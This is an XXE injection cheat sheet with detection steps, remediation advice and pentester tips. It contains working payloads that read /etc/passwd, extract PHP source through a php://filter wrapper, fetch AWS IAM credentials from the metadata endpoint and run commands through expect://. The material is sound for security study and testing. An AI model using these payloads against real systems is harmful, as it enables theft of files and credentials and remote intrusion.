

# XML External Entity (XXE) Injection

## 🧠 Overview

XXE vulnerabilities arise when an application parses XML input that contains a reference to an **external entity**, and the XML parser is insecurely configured to resolve that entity.

➡️ **Impact:** From sensitive file disclosure to full Remote Code Execution (RCE).

---

## 🔍 Identifying XXE

### 🧪 Step 1: Detect XML Processing

Identify endpoints that accept XML or where you can force the application to do so.

* **Classic:** `Content-Type: application/xml`
* **The "Switch" Trick:** Change `application/json` to `application/xml` and convert the body. Many backends will still try to parse it.

### 🧪 Step 2: Test Entity Reflection

Before trying to read files, test if the parser resolves internal entities.

```xml
<!DOCTYPE test [
  <!ENTITY mytest "Vulnerable Point">
]>
<root>&mytest;</root>

```

👉 **Success:** The response reflects "Vulnerable Point".

---

## 📂 Data Exfiltration

### 1. Reading Sensitive Files (`file://`)

The most common use case is reading system configuration or credentials.

```xml
<!DOCTYPE root [
  <!ENTITY secrets SYSTEM "file:///etc/passwd">
]>
<root>&secrets;</root>

```

### 2. Reading Source Code (Bypassing XML Breaks)

If you try to read a `.php` file directly, the `< ?php` tags will break the XML parser. To bypass this, we use PHP wrappers to encode the content.

```xml
<!DOCTYPE root [
  <!ENTITY source SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root>&source;</root>

```

*Decode the resulting Base64 string to get the cleartext source code.*

---

## 🌐 Escalation: XXE to SSRF

XXE is a powerful vector for **Server-Side Request Forgery**. You can use the server as a proxy to attack the internal network or cloud infrastructure.

**Targeting Cloud Metadata (AWS Example):**

```xml
<!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">

```

---

## 💥 Remote Code Execution (XXE → RCE)

This is rare and requires the **PHP `expect` wrapper** to be enabled, which is not the default in modern installations.

**Payload:**

```xml
<!DOCTYPE root [
  <!ENTITY rce SYSTEM "expect://id">
]>
<root>&rce;</root>

```

*If successful, the output of the `id` command will be reflected in the response.*

---

## 🛡️ Secure Implementation (Remediation)

The only 100% effective defense is to **disable DTDs (Document Type Definitions)** and external entities in your XML parser configuration.

**Example (PHP/libxml):**

```php
// Disable loading of external entities
libxml_disable_entity_loader(true);

```

**General Best Practices:**

* Use less complex data formats like **JSON**.
* Keep XML parsing libraries updated.
* Implement **Egress Filtering** (block outbound connections from the server).

---

## 💣 Pentester Mindset

* **No Reflection? No Problem:** If the data isn't reflected, go for **Blind XXE** using Out-of-Band (OOB) techniques.
* **The "File Upload" Connection:** Always test for XXE in file formats that use XML under the hood, such as **SVG, DOCX, and XLSX**.
* **Verify the Wrapper:** Different languages support different wrappers (`file://`, `http://`, `php://`, `expect://`). Always enumerate what's available.

